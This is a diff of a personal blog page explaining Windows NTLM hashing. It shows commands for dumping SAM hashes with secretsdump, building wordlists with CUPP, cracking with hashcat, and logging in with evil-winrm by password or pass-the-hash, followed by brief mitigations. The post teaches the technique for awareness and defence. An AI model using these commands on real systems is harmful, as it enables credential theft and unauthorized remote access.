@@ -1,40 +1,669 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Windows Password Hashing Deep Dive | JIT</title><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="css/style.css">
-<script src="js/script.js" defer></script>
-</head><body>
-<div class="container"><nav>
-<div><strong class="highlight">JIT</strong></div><div class="hamburger" onclick="toggleMenu()">☰</div><div class="nav-links">
-<a href="index.html">Home</a>
-<a href="blog.html" class="active">Blog</a>
-<a href="projects.html">Projects</a>
-<a href="contact.html">Contact</a>
-<span class="toggle" onclick="toggleMode()">🌙</span>
-</div>
-</nav><h1>Windows Password Hashing Deep Dive</h1><p class="muted">
-Published on May 16, 2026 • Written by Jit D • Imjitd.shonkuweb.com
-</p><div class="section">
-<p>
-Understanding NTLM hashes, SAM dumping, dictionary attacks, password cracking,
-Pass-the-Hash attacks, and Windows authentication internals.
-</p>
-</div><div class="section">
-<h2>Disclaimer</h2><p>
-This article is strictly for educational and defensive cybersecurity learning.
-Do not attempt unauthorized access to systems, accounts, or networks.
-</p>
-</div><h2>Introduction</h2><div class="section">
-<p>
-Cybersecurity demonstrations often look dramatic:
-</p><ul>
-<li>someone leaves a computer unlocked,</li>
-<li>an attacker copies a few files,</li>
-<li>runs a few commands,</li>
-<li>and suddenly gains remote access.</li>
-</ul><p>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+  <title>Windows Password Hashing Deep Dive | Jit D</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
+
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+    }
+
+    :root{
+      --bg:#060816;
+      --card:#0f172a;
+      --card2:#111827;
+      --border:#1e293b;
+      --text:#e2e8f0;
+      --muted:#94a3b8;
+      --primary:#38bdf8;
+      --green:#4ade80;
+      --danger:#fb7185;
+    }
+
+    html{
+      scroll-behavior:smooth;
+    }
+
+    body{
+      background:var(--bg);
+      color:var(--text);
+      font-family:'Inter',sans-serif;
+      line-height:1.8;
+      overflow-x:hidden;
+    }
+
+    .container{
+      width:90%;
+      max-width:950px;
+      margin:auto;
+    }
+
+    /* ================= NAVBAR ================= */
+
+    .navbar{
+      position:sticky;
+      top:0;
+      z-index:999;
+      backdrop-filter:blur(20px);
+      background:rgba(6,8,22,0.85);
+      border-bottom:1px solid rgba(255,255,255,0.05);
+    }
+
+    .nav-inner{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      padding:18px 0;
+    }
+
+    .logo{
+      text-decoration:none;
+      font-size:1rem;
+      font-weight:700;
+      letter-spacing:1px;
+      color:#fff;
+    }
+
+    .logo span{
+      color:var(--primary);
+    }
+
+    .nav-links{
+      display:flex;
+      gap:24px;
+    }
+
+    .nav-links a{
+      position:relative;
+      text-decoration:none;
+      color:var(--muted);
+      font-size:0.95rem;
+      transition:0.3s;
+    }
+
+    .nav-links a:hover,
+    .nav-links a.active{
+      color:#fff;
+    }
+
+    .nav-links a::after{
+      content:'';
+      position:absolute;
+      left:0;
+      bottom:-6px;
+      width:0%;
+      height:2px;
+      background:var(--primary);
+      transition:0.3s;
+    }
+
+    .nav-links a:hover::after,
+    .nav-links a.active::after{
+      width:100%;
+    }
+
+    /* ================= HERO ================= */
+
+    .hero{
+      padding:120px 0 80px;
+    }
+
+    .tag{
+      display:inline-block;
+      background:rgba(56,189,248,0.1);
+      color:var(--primary);
+      border:1px solid rgba(56,189,248,0.2);
+      padding:8px 14px;
+      border-radius:999px;
+      font-size:0.85rem;
+      margin-bottom:24px;
+    }
+
+    .hero h1{
+      font-size:4rem;
+      line-height:1.1;
+      font-weight:800;
+      letter-spacing:-2px;
+      margin-bottom:24px;
+    }
+
+    .hero p{
+      color:var(--muted);
+      font-size:1.15rem;
+      max-width:750px;
+      margin-bottom:35px;
+    }
+
+    .meta{
+      display:flex;
+      flex-wrap:wrap;
+      gap:20px;
+      color:var(--muted);
+      font-size:0.95rem;
+    }
+
+    .meta strong{
+      color:#fff;
+    }
+
+    /* ================= WARNING ================= */
+
+    .warning{
+      background:rgba(251,113,133,0.08);
+      border:1px solid rgba(251,113,133,0.2);
+      border-left:4px solid var(--danger);
+      padding:24px;
+      border-radius:18px;
+      margin:50px 0;
+    }
+
+    /* ================= ARTICLE ================= */
+
+    article{
+      padding-bottom:120px;
+    }
+
+    section{
+      margin-bottom:70px;
+    }
+
+    section h2{
+      font-size:2rem;
+      margin-bottom:20px;
+      color:#fff;
+      letter-spacing:-1px;
+    }
+
+    section p{
+      color:#cbd5e1;
+      margin-bottom:22px;
+      font-size:1.03rem;
+    }
+
+    ul{
+      padding-left:24px;
+      margin-bottom:20px;
+    }
+
+    li{
+      margin-bottom:10px;
+      color:#cbd5e1;
+    }
+
+    pre{
+      background:var(--card);
+      border:1px solid var(--border);
+      border-radius:18px;
+      padding:22px;
+      overflow-x:auto;
+      margin:28px 0;
+    }
+
+    code{
+      color:var(--green);
+      font-family:Consolas, monospace;
+      font-size:0.95rem;
+    }
+
+    blockquote{
+      border-left:4px solid var(--primary);
+      padding-left:20px;
+      color:#cbd5e1;
+      margin:35px 0;
+      font-size:1.05rem;
+    }
+
+    table{
+      width:100%;
+      border-collapse:collapse;
+      margin-top:25px;
+      overflow:hidden;
+      border-radius:16px;
+    }
+
+    table th{
+      background:var(--card2);
+      color:#fff;
+      text-align:left;
+      padding:16px;
+      border:1px solid var(--border);
+    }
+
+    table td{
+      padding:16px;
+      border:1px solid var(--border);
+      color:#cbd5e1;
+    }
+
+    .note{
+      background:rgba(56,189,248,0.08);
+      border:1px solid rgba(56,189,248,0.2);
+      border-left:4px solid var(--primary);
+      padding:22px;
+      border-radius:18px;
+      margin:35px 0;
+    }
+
+    /* ================= FOOTER ================= */
+
+    .footer{
+      border-top:1px solid rgba(255,255,255,0.06);
+      margin-top:120px;
+      padding:70px 0 30px;
+      background:rgba(255,255,255,0.01);
+    }
+
+    .footer-grid{
+      display:grid;
+      grid-template-columns:2fr 1fr 1fr;
+      gap:60px;
+    }
+
+    .footer-logo{
+      font-size:1.2rem;
+      font-weight:800;
+      color:#fff;
+      margin-bottom:18px;
+    }
+
+    .footer-logo span{
+      color:var(--primary);
+    }
+
+    .footer-brand p{
+      color:var(--muted);
+      max-width:420px;
+      line-height:1.8;
+    }
+
+    .footer-links h4{
+      margin-bottom:18px;
+      color:#fff;
+      font-size:1rem;
+    }
+
+    .footer-links{
+      display:flex;
+      flex-direction:column;
+    }
+
+    .footer-links a{
+      color:var(--muted);
+      text-decoration:none;
+      margin-bottom:12px;
+      transition:0.3s;
+    }
+
+    .footer-links a:hover{
+      color:#fff;
+    }
+
+    .footer-bottom{
+      border-top:1px solid rgba(255,255,255,0.05);
+      margin-top:50px;
+      padding-top:25px;
+      text-align:center;
+    }
+
+    .footer-bottom p{
+      color:var(--muted);
+      font-size:0.92rem;
+    }
+
+    /* ================= RESPONSIVE ================= */
+
+    @media(max-width:768px){
+
+      .hero{
+        padding-top:80px;
+      }
+
+      .hero h1{
+        font-size:2.4rem;
+      }
+
+      section h2{
+        font-size:1.5rem;
+      }
+
+      .nav-links{
+        display:none;
+      }
+
+      .footer-grid{
+        grid-template-columns:1fr;
+        gap:40px;
+      }
+
+      .footer{
+        padding-top:50px;
+      }
+
+    }
+
+  </style>
+</head>
+
+<body>
+
+  <!-- ================= NAVBAR ================= -->
+
+  <nav class="navbar">
+
+    <div class="container nav-inner">
+
+      <a href="/" class="logo">
+        IMJITD<span>.</span>
+      </a>
+
+      <div class="nav-links">
+
+        <a href="/">Home</a>
+
+        <a href="/articles.html" class="active">
+          Articles
+        </a>
+
+        <a href="/projects.html">
+          Projects
+        </a>
+
+        <a href="/security.html">
+          Security
+        </a>
+
+        <a href="/contact.html">
+          Contact
+        </a>
+
+      </div>
+
+    </div>
+
+  </nav>
+
+  <!-- ================= MAIN ================= -->
+
+  <div class="container">
+
+    <section class="hero">
+
+      <div class="tag">
+        Cybersecurity • Windows Internals • NTLM
+      </div>
+
+      <h1>
+        Windows Password Hashing Deep Dive
+      </h1>
+
+      <p>
+        Understanding NTLM hashes, SAM dumping, password cracking,
+        pass-the-hash attacks, and Windows authentication internals.
+      </p>
+
+      <div class="meta">
+        <div><strong>Author:</strong> Jit D</div>
+        <div><strong>Date:</strong> May 16, 2026</div>
+        <div><strong>Website:</strong> Imjitd.shonkuweb.com</div>
+      </div>
+
+    </section>
+
+    <div class="warning">
+
+      <strong>Disclaimer</strong><br><br>
+
+      This article is strictly for educational and defensive cybersecurity learning.
+      Do not attempt unauthorized access to systems, accounts, or networks.
+
+    </div>
+
+    <!-- ================= ARTICLE ================= -->
+
+    <article>
+
+      <section>
+
+        <h2>Introduction</h2>
+
+        <p>
+          Cybersecurity demonstrations often look dramatic:
+        </p>
+
+        <ul>
+          <li>someone leaves a computer unlocked,</li>
+          <li>an attacker copies a few files,</li>
+          <li>runs a few commands,</li>
+          <li>and suddenly gains remote access.</li>
+        </ul>
+
+        <p>
+          But underneath the theatrics are very real Windows authentication concepts.
+        </p>
+
+        <blockquote>
+          Password hashes should be treated as credentials themselves.
+        </blockquote>
+
+      </section>
+
+      <section>
+
+        <h2>How Windows Stores Passwords</h2>
+
+        <p>
+          Windows does not store passwords in plaintext.
+          Instead, passwords are transformed into hashes using cryptographic algorithms.
+        </p>
+
+<pre><code>Password:
+MyPassword123
+
+NTLM Hash:
+58A478135A93AC3BF058A5EA0E8FDB71</code></pre>
+
+      </section>
+
+      <section>
+
+        <h2>What Is the SAM Database?</h2>
+
+        <p>
+          Windows stores local account hashes inside the Security Account Manager.
+        </p>
+
+<pre><code>HKEY_LOCAL_MACHINE\SAM</code></pre>
+
+<pre><code>HKEY_LOCAL_MACHINE\SYSTEM</code></pre>
+
+      </section>
+
+      <section>
+
+        <h2>Extracting NTLM Hashes</h2>
+
+<pre><code>impacket-secretsdump \
+-sam sam.save \
+-system system.save \
+LOCAL</code></pre>
+
+<pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:
+58A478135A93AC3BF058A5EA0E8FDB71:::</code></pre>
+
+      </section>
+
+      <section>
+
+        <h2>Dictionary Attacks</h2>
+
+        <ul>
+          <li>Names</li>
+          <li>Birthdays</li>
+          <li>Pets</li>
+          <li>Seasons</li>
+          <li>Favorite words</li>
+        </ul>
+
+      </section>
+
+      <section>
+
+        <h2>Generating Wordlists with CUPP</h2>
+
+<pre><code>cupp -i</code></pre>
+
+<pre><code>Michael2025
+Amanda123!
+BeatlesSummer2024</code></pre>
+
+      </section>
+
+      <section>
+
+        <h2>Cracking NTLM Hashes with Hashcat</h2>
+
+<pre><code>hashcat -m 1000 hashes.txt wordlist.txt</code></pre>
+
+<pre><code>Status...........: Cracked</code></pre>
+
+      </section>
+
+      <section>
+
+        <h2>Remote Access with Evil-WinRM</h2>
+
+<pre><code>evil-winrm -i 192.168.1.50 -u michael -p Password123</code></pre>
+
+      </section>
+
+      <section>
+
+        <h2>Pass-the-Hash Attacks</h2>
+
+<pre><code>evil-winrm -i 192.168.1.50 -u michael -H HASH</code></pre>
+
+        <div class="note">
+
+          <strong>Important:</strong><br><br>
+
+          The attacker authenticates using the NTLM hash itself —
+          without ever knowing the plaintext password.
+
+        </div>
+
+      </section>
+
+      <section>
+
+        <h2>Security Mitigations</h2>
+
+        <ul>
+          <li>Lock your computer</li>
+          <li>Use strong passwords</li>
+          <li>Use password managers</li>
+          <li>Enable Credential Guard</li>
+          <li>Restrict administrative access</li>
+          <li>Monitor registry hive exports</li>
+          <li>Reduce NTLM usage</li>
+        </ul>
+
+      </section>
+
+      <section>
+
+        <h2>Final Thoughts</h2>
+
+        <p>
+          The techniques shown in this workflow are real offensive security methods
+          used in penetration testing and red team operations.
+        </p>
+
+<pre><code>Password hashes should be treated as passwords themselves.</code></pre>
+
+      </section>
+
+    </article>
+
+  </div>
+
+  <!-- ================= FOOTER ================= -->
+
+  <footer class="footer">
+
+    <div class="container">
+
+      <div class="footer-grid">
+
+        <div class="footer-brand">
+
+          <div class="footer-logo">
+            IMJITD<span>.</span>
+          </div>
+
+          <p>
+            Personal website of Jit D focused on
+            cybersecurity, AI systems, software engineering,
+            offensive security research, and technical writing.
+          </p>
+
+        </div>
+
+        <div class="footer-links">
+
+          <h4>Navigation</h4>
+
+          <a href="/">Home</a>
+          <a href="/articles.html">Articles</a>
+          <a href="/projects.html">Projects</a>
+          <a href="/security.html">Security</a>
+
+        </div>
+
+        <div class="footer-links">
+
+          <h4>Connect</h4>
+
+          <a href="https://github.com/">
+            GitHub
+          </a>
+
+          <a href="https://linkedin.com/">
+            LinkedIn
+          </a>
+
+          <a href="mailto:contact@imjitd.shonkuweb.com">
+            Email
+          </a>
+
+        </div>
+
+      </div>
+
+      <div class="footer-bottom">
+
+        <p>
+          © 2026 IMJITD • Built by Jit D • Imjitd.shonkuweb.com
+        </p>
+
+      </div>
+
+    </div>
+
+  </footer>
+
+</body>
+</html></ul><p>
 But behind the theatrics are very real Windows authentication concepts.
 </p><p>
 This article explains the complete workflow shown in the video:
